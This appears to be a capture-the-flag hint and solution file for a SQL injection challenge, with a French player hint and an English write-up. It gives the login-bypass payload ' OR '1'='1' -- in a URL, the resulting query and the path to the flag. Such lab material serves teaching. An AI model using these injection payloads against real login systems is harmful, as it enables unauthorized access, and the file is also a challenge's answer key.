Hint (à fournir aux joueurs)

Testez les champs avec des quotes ' et essayez username=' OR '1'='1 etc.

Regarder la requête SQL dans la réponse d'erreur peut aider.

Solution / write-up (à mettre dans /ctf/solutions/sqli.md)

Go to /login?username=' OR '1'='1' -- &password=anything

Query becomes SELECT username FROM users WHERE username = '' OR '1'='1' -- ' AND password='anything';

Condition OR '1'='1' always true → returns first user → then go to /flag to read the flag (some CTF designs require reaching an admin page; here flag endpoint accessible after exploitation).